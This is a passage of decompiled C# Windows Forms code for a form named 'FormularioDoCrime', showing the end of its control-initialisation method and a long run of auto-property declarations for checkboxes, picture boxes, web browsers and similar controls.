			base.Controls.Add(this.MaskedTextBox3);
			base.Controls.Add(this.NumericUpDown3);
			base.Controls.Add(this.PictureBox5);
			base.Controls.Add(this.WebBrowser2);
			base.Controls.Add(this.TreeView2);
			base.Controls.Add(this.TextBox2);
			base.Controls.Add(this.RadioButton3);
			base.Controls.Add(this.RadioButton4);
			base.Controls.Add(this.PictureBox6);
			base.Controls.Add(this.ComboBox3);
			base.Controls.Add(this.Label2);
			base.Controls.Add(this.ListView2);
			base.Controls.Add(this.DateTimePicker3);
			base.Controls.Add(this.MonthCalendar2);
			base.Controls.Add(this.PictureBox7);
			base.Controls.Add(this.NumericUpDown4);
			base.Controls.Add(this.ProgressBar2);
			base.Controls.Add(this.PictureBox8);
			base.Controls.Add(this.MaskedTextBox4);
			base.Controls.Add(this.ComboBox4);
			base.Controls.Add(this.CheckedListBox4);
			base.Controls.Add(this.DateTimePicker4);
			base.Controls.Add(this.CheckedListBox5);
			base.Controls.Add(this.CheckedListBox6);
			base.Controls.Add(this.MaskedTextBox2);
			base.Controls.Add(this.NumericUpDown2);
			base.Controls.Add(this.PictureBox4);
			base.Controls.Add(this.WebBrowser1);
			base.Controls.Add(this.TreeView1);
			base.Controls.Add(this.TextBox1);
			base.Controls.Add(this.RadioButton2);
			base.Controls.Add(this.RadioButton1);
			base.Controls.Add(this.PictureBox3);
			base.Controls.Add(this.ComboBox2);
			base.Controls.Add(this.Label1);
			base.Controls.Add(this.ListView1);
			base.Controls.Add(this.DateTimePicker2);
			base.Controls.Add(this.MonthCalendar1);
			base.Controls.Add(this.PictureBox2);
			base.Controls.Add(this.NumericUpDown1);
			base.Controls.Add(this.ProgressBar1);
			base.Controls.Add(this.PictureBox1);
			base.Controls.Add(this.MaskedTextBox1);
			base.Controls.Add(this.ComboBox1);
			base.Controls.Add(this.CheckedListBox3);
			base.Controls.Add(this.DateTimePicker1);
			base.Controls.Add(this.CheckedListBox2);
			base.Controls.Add(this.CheckedListBox1);
			base.Name = "FormularioDoCrime";
			this.Text = "FormularioDoCrime";
			((ISupportInitialize)this.PictureBox1).EndInit();
			((ISupportInitialize)this.NumericUpDown1).EndInit();
			((ISupportInitialize)this.PictureBox2).EndInit();
			((ISupportInitialize)this.PictureBox3).EndInit();
			((ISupportInitialize)this.PictureBox4).EndInit();
			((ISupportInitialize)this.NumericUpDown2).EndInit();
			((ISupportInitialize)this.NumericUpDown3).EndInit();
			((ISupportInitialize)this.PictureBox5).EndInit();
			((ISupportInitialize)this.PictureBox6).EndInit();
			((ISupportInitialize)this.PictureBox7).EndInit();
			((ISupportInitialize)this.NumericUpDown4).EndInit();
			((ISupportInitialize)this.PictureBox8).EndInit();
			((ISupportInitialize)this.NumericUpDown5).EndInit();
			((ISupportInitialize)this.PictureBox9).EndInit();
			((ISupportInitialize)this.PictureBox10).EndInit();
			((ISupportInitialize)this.PictureBox11).EndInit();
			((ISupportInitialize)this.NumericUpDown6).EndInit();
			((ISupportInitialize)this.PictureBox12).EndInit();
			((ISupportInitialize)this.NumericUpDown7).EndInit();
			((ISupportInitialize)this.PictureBox13).EndInit();
			((ISupportInitialize)this.PictureBox14).EndInit();
			((ISupportInitialize)this.PictureBox15).EndInit();
			((ISupportInitialize)this.NumericUpDown8).EndInit();
			((ISupportInitialize)this.PictureBox16).EndInit();
			((ISupportInitialize)this.NumericUpDown9).EndInit();
			((ISupportInitialize)this.PictureBox17).EndInit();
			((ISupportInitialize)this.PictureBox18).EndInit();
			((ISupportInitialize)this.PictureBox19).EndInit();
			((ISupportInitialize)this.NumericUpDown10).EndInit();
			((ISupportInitialize)this.PictureBox20).EndInit();
			((ISupportInitialize)this.NumericUpDown11).EndInit();
			((ISupportInitialize)this.PictureBox21).EndInit();
			((ISupportInitialize)this.PictureBox22).EndInit();
			((ISupportInitialize)this.PictureBox23).EndInit();
			((ISupportInitialize)this.NumericUpDown12).EndInit();
			((ISupportInitialize)this.PictureBox24).EndInit();
			((ISupportInitialize)this.NumericUpDown13).EndInit();
			((ISupportInitialize)this.PictureBox25).EndInit();
			((ISupportInitialize)this.PictureBox26).EndInit();
			((ISupportInitialize)this.PictureBox27).EndInit();
			((ISupportInitialize)this.NumericUpDown14).EndInit();
			((ISupportInitialize)this.PictureBox28).EndInit();
			((ISupportInitialize)this.NumericUpDown15).EndInit();
			((ISupportInitialize)this.PictureBox29).EndInit();
			((ISupportInitialize)this.PictureBox30).EndInit();
			((ISupportInitialize)this.PictureBox31).EndInit();
			((ISupportInitialize)this.NumericUpDown16).EndInit();
			((ISupportInitialize)this.PictureBox32).EndInit();
			((ISupportInitialize)this.NumericUpDown17).EndInit();
			((ISupportInitialize)this.PictureBox33).EndInit();
			((ISupportInitialize)this.PictureBox34).EndInit();
			((ISupportInitialize)this.PictureBox35).EndInit();
			((ISupportInitialize)this.NumericUpDown18).EndInit();
			((ISupportInitialize)this.PictureBox36).EndInit();
			((ISupportInitialize)this.NumericUpDown19).EndInit();
			((ISupportInitialize)this.PictureBox37).EndInit();
			((ISupportInitialize)this.PictureBox38).EndInit();
			((ISupportInitialize)this.PictureBox39).EndInit();
			((ISupportInitialize)this.NumericUpDown20).EndInit();
			((ISupportInitialize)this.PictureBox40).EndInit();
			((ISupportInitialize)this.NumericUpDown21).EndInit();
			((ISupportInitialize)this.PictureBox41).EndInit();
			((ISupportInitialize)this.PictureBox42).EndInit();
			((ISupportInitialize)this.PictureBox43).EndInit();
			((ISupportInitialize)this.NumericUpDown22).EndInit();
			((ISupportInitialize)this.PictureBox44).EndInit();
			((ISupportInitialize)this.NumericUpDown23).EndInit();
			((ISupportInitialize)this.PictureBox45).EndInit();
			((ISupportInitialize)this.PictureBox46).EndInit();
			((ISupportInitialize)this.PictureBox47).EndInit();
			((ISupportInitialize)this.NumericUpDown24).EndInit();
			((ISupportInitialize)this.PictureBox48).EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x17000469 RID: 1129
		// (get) Token: 0x06000901 RID: 2305 RVA: 0x00036071 File Offset: 0x00034271
		// (set) Token: 0x06000902 RID: 2306 RVA: 0x00036079 File Offset: 0x00034279
		internal virtual CheckedListBox CheckedListBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700046A RID: 1130
		// (get) Token: 0x06000903 RID: 2307 RVA: 0x00036082 File Offset: 0x00034282
		// (set) Token: 0x06000904 RID: 2308 RVA: 0x0003608A File Offset: 0x0003428A
		internal virtual CheckedListBox CheckedListBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700046B RID: 1131
		// (get) Token: 0x06000905 RID: 2309 RVA: 0x00036093 File Offset: 0x00034293
		// (set) Token: 0x06000906 RID: 2310 RVA: 0x0003609B File Offset: 0x0003429B
		internal virtual DateTimePicker DateTimePicker1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700046C RID: 1132
		// (get) Token: 0x06000907 RID: 2311 RVA: 0x000360A4 File Offset: 0x000342A4
		// (set) Token: 0x06000908 RID: 2312 RVA: 0x000360AC File Offset: 0x000342AC
		internal virtual CheckedListBox CheckedListBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700046D RID: 1133
		// (get) Token: 0x06000909 RID: 2313 RVA: 0x000360B5 File Offset: 0x000342B5
		// (set) Token: 0x0600090A RID: 2314 RVA: 0x000360BD File Offset: 0x000342BD
		internal virtual ComboBox ComboBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700046E RID: 1134
		// (get) Token: 0x0600090B RID: 2315 RVA: 0x000360C6 File Offset: 0x000342C6
		// (set) Token: 0x0600090C RID: 2316 RVA: 0x000360CE File Offset: 0x000342CE
		internal virtual MaskedTextBox MaskedTextBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700046F RID: 1135
		// (get) Token: 0x0600090D RID: 2317 RVA: 0x000360D7 File Offset: 0x000342D7
		// (set) Token: 0x0600090E RID: 2318 RVA: 0x000360DF File Offset: 0x000342DF
		internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000470 RID: 1136
		// (get) Token: 0x0600090F RID: 2319 RVA: 0x000360E8 File Offset: 0x000342E8
		// (set) Token: 0x06000910 RID: 2320 RVA: 0x000360F0 File Offset: 0x000342F0
		internal virtual ProgressBar ProgressBar1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000471 RID: 1137
		// (get) Token: 0x06000911 RID: 2321 RVA: 0x000360F9 File Offset: 0x000342F9
		// (set) Token: 0x06000912 RID: 2322 RVA: 0x00036101 File Offset: 0x00034301
		internal virtual NumericUpDown NumericUpDown1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000472 RID: 1138
		// (get) Token: 0x06000913 RID: 2323 RVA: 0x0003610A File Offset: 0x0003430A
		// (set) Token: 0x06000914 RID: 2324 RVA: 0x00036112 File Offset: 0x00034312
		internal virtual ToolTip ToolTip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000473 RID: 1139
		// (get) Token: 0x06000915 RID: 2325 RVA: 0x0003611B File Offset: 0x0003431B
		// (set) Token: 0x06000916 RID: 2326 RVA: 0x00036123 File Offset: 0x00034323
		internal virtual PictureBox PictureBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000474 RID: 1140
		// (get) Token: 0x06000917 RID: 2327 RVA: 0x0003612C File Offset: 0x0003432C
		// (set) Token: 0x06000918 RID: 2328 RVA: 0x00036134 File Offset: 0x00034334
		internal virtual MonthCalendar MonthCalendar1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000475 RID: 1141
		// (get) Token: 0x06000919 RID: 2329 RVA: 0x0003613D File Offset: 0x0003433D
		// (set) Token: 0x0600091A RID: 2330 RVA: 0x00036145 File Offset: 0x00034345
		internal virtual DateTimePicker DateTimePicker2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000476 RID: 1142
		// (get) Token: 0x0600091B RID: 2331 RVA: 0x0003614E File Offset: 0x0003434E
		// (set) Token: 0x0600091C RID: 2332 RVA: 0x00036156 File Offset: 0x00034356
		internal virtual ListView ListView1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000477 RID: 1143
		// (get) Token: 0x0600091D RID: 2333 RVA: 0x0003615F File Offset: 0x0003435F
		// (set) Token: 0x0600091E RID: 2334 RVA: 0x00036167 File Offset: 0x00034367
		internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000478 RID: 1144
		// (get) Token: 0x0600091F RID: 2335 RVA: 0x00036170 File Offset: 0x00034370
		// (set) Token: 0x06000920 RID: 2336 RVA: 0x00036178 File Offset: 0x00034378
		internal virtual ComboBox ComboBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000479 RID: 1145
		// (get) Token: 0x06000921 RID: 2337 RVA: 0x00036181 File Offset: 0x00034381
		// (set) Token: 0x06000922 RID: 2338 RVA: 0x00036189 File Offset: 0x00034389
		internal virtual PictureBox PictureBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700047A RID: 1146
		// (get) Token: 0x06000923 RID: 2339 RVA: 0x00036192 File Offset: 0x00034392
		// (set) Token: 0x06000924 RID: 2340 RVA: 0x0003619A File Offset: 0x0003439A
		internal virtual RadioButton RadioButton1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700047B RID: 1147
		// (get) Token: 0x06000925 RID: 2341 RVA: 0x000361A3 File Offset: 0x000343A3
		// (set) Token: 0x06000926 RID: 2342 RVA: 0x000361AB File Offset: 0x000343AB
		internal virtual RadioButton RadioButton2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700047C RID: 1148
		// (get) Token: 0x06000927 RID: 2343 RVA: 0x000361B4 File Offset: 0x000343B4
		// (set) Token: 0x06000928 RID: 2344 RVA: 0x000361BC File Offset: 0x000343BC
		internal virtual ToolTip ToolTip2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700047D RID: 1149
		// (get) Token: 0x06000929 RID: 2345 RVA: 0x000361C5 File Offset: 0x000343C5
		// (set) Token: 0x0600092A RID: 2346 RVA: 0x000361CD File Offset: 0x000343CD
		internal virtual TextBox TextBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700047E RID: 1150
		// (get) Token: 0x0600092B RID: 2347 RVA: 0x000361D6 File Offset: 0x000343D6
		// (set) Token: 0x0600092C RID: 2348 RVA: 0x000361DE File Offset: 0x000343DE
		internal virtual TreeView TreeView1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700047F RID: 1151
		// (get) Token: 0x0600092D RID: 2349 RVA: 0x000361E7 File Offset: 0x000343E7
		// (set) Token: 0x0600092E RID: 2350 RVA: 0x000361EF File Offset: 0x000343EF
		internal virtual WebBrowser WebBrowser1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000480 RID: 1152
		// (get) Token: 0x0600092F RID: 2351 RVA: 0x000361F8 File Offset: 0x000343F8
		// (set) Token: 0x06000930 RID: 2352 RVA: 0x00036200 File Offset: 0x00034400
		internal virtual PictureBox PictureBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000481 RID: 1153
		// (get) Token: 0x06000931 RID: 2353 RVA: 0x00036209 File Offset: 0x00034409
		// (set) Token: 0x06000932 RID: 2354 RVA: 0x00036211 File Offset: 0x00034411
		internal virtual NumericUpDown NumericUpDown2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000482 RID: 1154
		// (get) Token: 0x06000933 RID: 2355 RVA: 0x0003621A File Offset: 0x0003441A
		// (set) Token: 0x06000934 RID: 2356 RVA: 0x00036222 File Offset: 0x00034422
		internal virtual MaskedTextBox MaskedTextBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000483 RID: 1155
		// (get) Token: 0x06000935 RID: 2357 RVA: 0x0003622B File Offset: 0x0003442B
		// (set) Token: 0x06000936 RID: 2358 RVA: 0x00036233 File Offset: 0x00034433
		internal virtual MaskedTextBox MaskedTextBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000484 RID: 1156
		// (get) Token: 0x06000937 RID: 2359 RVA: 0x0003623C File Offset: 0x0003443C
		// (set) Token: 0x06000938 RID: 2360 RVA: 0x00036244 File Offset: 0x00034444
		internal virtual NumericUpDown NumericUpDown3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000485 RID: 1157
		// (get) Token: 0x06000939 RID: 2361 RVA: 0x0003624D File Offset: 0x0003444D
		// (set) Token: 0x0600093A RID: 2362 RVA: 0x00036255 File Offset: 0x00034455
		internal virtual PictureBox PictureBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000486 RID: 1158
		// (get) Token: 0x0600093B RID: 2363 RVA: 0x0003625E File Offset: 0x0003445E
		// (set) Token: 0x0600093C RID: 2364 RVA: 0x00036266 File Offset: 0x00034466
		internal virtual WebBrowser WebBrowser2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000487 RID: 1159
		// (get) Token: 0x0600093D RID: 2365 RVA: 0x0003626F File Offset: 0x0003446F
		// (set) Token: 0x0600093E RID: 2366 RVA: 0x00036277 File Offset: 0x00034477
		internal virtual TreeView TreeView2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000488 RID: 1160
		// (get) Token: 0x0600093F RID: 2367 RVA: 0x00036280 File Offset: 0x00034480
		// (set) Token: 0x06000940 RID: 2368 RVA: 0x00036288 File Offset: 0x00034488
		internal virtual TextBox TextBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000489 RID: 1161
		// (get) Token: 0x06000941 RID: 2369 RVA: 0x00036291 File Offset: 0x00034491
		// (set) Token: 0x06000942 RID: 2370 RVA: 0x00036299 File Offset: 0x00034499
		internal virtual RadioButton RadioButton3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700048A RID: 1162
		// (get) Token: 0x06000943 RID: 2371 RVA: 0x000362A2 File Offset: 0x000344A2
		// (set) Token: 0x06000944 RID: 2372 RVA: 0x000362AA File Offset: 0x000344AA
		internal virtual RadioButton RadioButton4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700048B RID: 1163
		// (get) Token: 0x06000945 RID: 2373 RVA: 0x000362B3 File Offset: 0x000344B3
		// (set) Token: 0x06000946 RID: 2374 RVA: 0x000362BB File Offset: 0x000344BB
		internal virtual PictureBox PictureBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700048C RID: 1164
		// (get) Token: 0x06000947 RID: 2375 RVA: 0x000362C4 File Offset: 0x000344C4
		// (set) Token: 0x06000948 RID: 2376 RVA: 0x000362CC File Offset: 0x000344CC
		internal virtual ComboBox ComboBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700048D RID: 1165
		// (get) Token: 0x06000949 RID: 2377 RVA: 0x000362D5 File Offset: 0x000344D5
		// (set) Token: 0x0600094A RID: 2378 RVA: 0x000362DD File Offset: 0x000344DD
		internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700048E RID: 1166
		// (get) Token: 0x0600094B RID: 2379 RVA: 0x000362E6 File Offset: 0x000344E6
		// (set) Token: 0x0600094C RID: 2380 RVA: 0x000362EE File Offset: 0x000344EE
		internal virtual ListView ListView2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700048F RID: 1167
		// (get) Token: 0x0600094D RID: 2381 RVA: 0x000362F7 File Offset: 0x000344F7
		// (set) Token: 0x0600094E RID: 2382 RVA: 0x000362FF File Offset: 0x000344FF
		internal virtual DateTimePicker DateTimePicker3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000490 RID: 1168
		// (get) Token: 0x0600094F RID: 2383 RVA: 0x00036308 File Offset: 0x00034508
		// (set) Token: 0x06000950 RID: 2384 RVA: 0x00036310 File Offset: 0x00034510
		internal virtual MonthCalendar MonthCalendar2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000491 RID: 1169
		// (get) Token: 0x06000951 RID: 2385 RVA: 0x00036319 File Offset: 0x00034519
		// (set) Token: 0x06000952 RID: 2386 RVA: 0x00036321 File Offset: 0x00034521
		internal virtual PictureBox PictureBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000492 RID: 1170
		// (get) Token: 0x06000953 RID: 2387 RVA: 0x0003632A File Offset: 0x0003452A
		// (set) Token: 0x06000954 RID: 2388 RVA: 0x00036332 File Offset: 0x00034532
		internal virtual NumericUpDown NumericUpDown4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000493 RID: 1171
		// (get) Token: 0x06000955 RID: 2389 RVA: 0x0003633B File Offset: 0x0003453B
		// (set) Token: 0x06000956 RID: 2390 RVA: 0x00036343 File Offset: 0x00034543
		internal virtual ProgressBar ProgressBar2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000494 RID: 1172
		// (get) Token: 0x06000957 RID: 2391 RVA: 0x0003634C File Offset: 0x0003454C
		// (set) Token: 0x06000958 RID: 2392 RVA: 0x00036354 File Offset: 0x00034554
		internal virtual PictureBox PictureBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000495 RID: 1173
		// (get) Token: 0x06000959 RID: 2393 RVA: 0x0003635D File Offset: 0x0003455D
		// (set) Token: 0x0600095A RID: 2394 RVA: 0x00036365 File Offset: 0x00034565
		internal virtual MaskedTextBox MaskedTextBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000496 RID: 1174
		// (get) Token: 0x0600095B RID: 2395 RVA: 0x0003636E File Offset: 0x0003456E
		// (set) Token: 0x0600095C RID: 2396 RVA: 0x00036376 File Offset: 0x00034576
		internal virtual ComboBox ComboBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000497 RID: 1175
		// (get) Token: 0x0600095D RID: 2397 RVA: 0x0003637F File Offset: 0x0003457F
		// (set) Token: 0x0600095E RID: 2398 RVA: 0x00036387 File Offset: 0x00034587
		internal virtual CheckedListBox CheckedListBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000498 RID: 1176
		// (get) Token: 0x0600095F RID: 2399 RVA: 0x00036390 File Offset: 0x00034590
		// (set) Token: 0x06000960 RID: 2400 RVA: 0x00036398 File Offset: 0x00034598
		internal virtual DateTimePicker DateTimePicker4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000499 RID: 1177
		// (get) Token: 0x06000961 RID: 2401 RVA: 0x000363A1 File Offset: 0x000345A1
		// (set) Token: 0x06000962 RID: 2402 RVA: 0x000363A9 File Offset: 0x000345A9
		internal virtual CheckedListBox CheckedListBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700049A RID: 1178
		// (get) Token: 0x06000963 RID: 2403 RVA: 0x000363B2 File Offset: 0x000345B2
		// (set) Token: 0x06000964 RID: 2404 RVA: 0x000363BA File Offset: 0x000345BA
		internal virtual CheckedListBox CheckedListBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700049B RID: 1179
		// (get) Token: 0x06000965 RID: 2405 RVA: 0x000363C3 File Offset: 0x000345C3
		// (set) Token: 0x06000966 RID: 2406 RVA: 0x000363CB File Offset: 0x000345CB
		internal virtual MaskedTextBox MaskedTextBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700049C RID: 1180
		// (get) Token: 0x06000967 RID: 2407 RVA: 0x000363D4 File Offset: 0x000345D4
		// (set) Token: 0x06000968 RID: 2408 RVA: 0x000363DC File Offset: 0x000345DC
		internal virtual NumericUpDown NumericUpDown5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700049D RID: 1181
		// (get) Token: 0x06000969 RID: 2409 RVA: 0x000363E5 File Offset: 0x000345E5
		// (set) Token: 0x0600096A RID: 2410 RVA: 0x000363ED File Offset: 0x000345ED
		internal virtual PictureBox PictureBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700049E RID: 1182
		// (get) Token: 0x0600096B RID: 2411 RVA: 0x000363F6 File Offset: 0x000345F6
		// (set) Token: 0x0600096C RID: 2412 RVA: 0x000363FE File Offset: 0x000345FE
		internal virtual WebBrowser WebBrowser3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700049F RID: 1183
		// (get) Token: 0x0600096D RID: 2413 RVA: 0x00036407 File Offset: 0x00034607
		// (set) Token: 0x0600096E RID: 2414 RVA: 0x0003640F File Offset: 0x0003460F
		internal virtual TreeView TreeView3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004A0 RID: 1184
		// (get) Token: 0x0600096F RID: 2415 RVA: 0x00036418 File Offset: 0x00034618
		// (set) Token: 0x06000970 RID: 2416 RVA: 0x00036420 File Offset: 0x00034620
		internal virtual TextBox TextBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004A1 RID: 1185
		// (get) Token: 0x06000971 RID: 2417 RVA: 0x00036429 File Offset: 0x00034629
		// (set) Token: 0x06000972 RID: 2418 RVA: 0x00036431 File Offset: 0x00034631
		internal virtual RadioButton RadioButton5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004A2 RID: 1186
		// (get) Token: 0x06000973 RID: 2419 RVA: 0x0003643A File Offset: 0x0003463A
		// (set) Token: 0x06000974 RID: 2420 RVA: 0x00036442 File Offset: 0x00034642
		internal virtual RadioButton RadioButton6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004A3 RID: 1187
		// (get) Token: 0x06000975 RID: 2421 RVA: 0x0003644B File Offset: 0x0003464B
		// (set) Token: 0x06000976 RID: 2422 RVA: 0x00036453 File Offset: 0x00034653
		internal virtual PictureBox PictureBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004A4 RID: 1188
		// (get) Token: 0x06000977 RID: 2423 RVA: 0x0003645C File Offset: 0x0003465C
		// (set) Token: 0x06000978 RID: 2424 RVA: 0x00036464 File Offset: 0x00034664
		internal virtual ComboBox ComboBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004A5 RID: 1189
		// (get) Token: 0x06000979 RID: 2425 RVA: 0x0003646D File Offset: 0x0003466D
		// (set) Token: 0x0600097A RID: 2426 RVA: 0x00036475 File Offset: 0x00034675
		internal virtual Label Label3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004A6 RID: 1190
		// (get) Token: 0x0600097B RID: 2427 RVA: 0x0003647E File Offset: 0x0003467E
		// (set) Token: 0x0600097C RID: 2428 RVA: 0x00036486 File Offset: 0x00034686
		internal virtual ListView ListView3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004A7 RID: 1191
		// (get) Token: 0x0600097D RID: 2429 RVA: 0x0003648F File Offset: 0x0003468F
		// (set) Token: 0x0600097E RID: 2430 RVA: 0x00036497 File Offset: 0x00034697
		internal virtual DateTimePicker DateTimePicker5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004A8 RID: 1192
		// (get) Token: 0x0600097F RID: 2431 RVA: 0x000364A0 File Offset: 0x000346A0
		// (set) Token: 0x06000980 RID: 2432 RVA: 0x000364A8 File Offset: 0x000346A8
		internal virtual MonthCalendar MonthCalendar3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004A9 RID: 1193
		// (get) Token: 0x06000981 RID: 2433 RVA: 0x000364B1 File Offset: 0x000346B1
		// (set) Token: 0x06000982 RID: 2434 RVA: 0x000364B9 File Offset: 0x000346B9
		internal virtual PictureBox PictureBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004AA RID: 1194
		// (get) Token: 0x06000983 RID: 2435 RVA: 0x000364C2 File Offset: 0x000346C2
		// (set) Token: 0x06000984 RID: 2436 RVA: 0x000364CA File Offset: 0x000346CA
		internal virtual NumericUpDown NumericUpDown6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004AB RID: 1195
		// (get) Token: 0x06000985 RID: 2437 RVA: 0x000364D3 File Offset: 0x000346D3
		// (set) Token: 0x06000986 RID: 2438 RVA: 0x000364DB File Offset: 0x000346DB
		internal virtual ProgressBar ProgressBar3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004AC RID: 1196
		// (get) Token: 0x06000987 RID: 2439 RVA: 0x000364E4 File Offset: 0x000346E4
		// (set) Token: 0x06000988 RID: 2440 RVA: 0x000364EC File Offset: 0x000346EC
		internal virtual PictureBox PictureBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004AD RID: 1197
		// (get) Token: 0x06000989 RID: 2441 RVA: 0x000364F5 File Offset: 0x000346F5
		// (set) Token: 0x0600098A RID: 2442 RVA: 0x000364FD File Offset: 0x000346FD
		internal virtual MaskedTextBox MaskedTextBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004AE RID: 1198
		// (get) Token: 0x0600098B RID: 2443 RVA: 0x00036506 File Offset: 0x00034706
		// (set) Token: 0x0600098C RID: 2444 RVA: 0x0003650E File Offset: 0x0003470E
		internal virtual ComboBox ComboBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004AF RID: 1199
		// (get) Token: 0x0600098D RID: 2445 RVA: 0x00036517 File Offset: 0x00034717
		// (set) Token: 0x0600098E RID: 2446 RVA: 0x0003651F File Offset: 0x0003471F
		internal virtual CheckedListBox CheckedListBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004B0 RID: 1200
		// (get) Token: 0x0600098F RID: 2447 RVA: 0x00036528 File Offset: 0x00034728
		// (set) Token: 0x06000990 RID: 2448 RVA: 0x00036530 File Offset: 0x00034730
		internal virtual DateTimePicker DateTimePicker6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004B1 RID: 1201
		// (get) Token: 0x06000991 RID: 2449 RVA: 0x00036539 File Offset: 0x00034739
		// (set) Token: 0x06000992 RID: 2450 RVA: 0x00036541 File Offset: 0x00034741
		internal virtual CheckedListBox CheckedListBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004B2 RID: 1202
		// (get) Token: 0x06000993 RID: 2451 RVA: 0x0003654A File Offset: 0x0003474A
		// (set) Token: 0x06000994 RID: 2452 RVA: 0x00036552 File Offset: 0x00034752
		internal virtual CheckedListBox CheckedListBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170004B3 RID: 1203
		// (get) Token: 0x06000995 RID: 2453 RVA: 0x0003655B File Offset: 0x0003475B
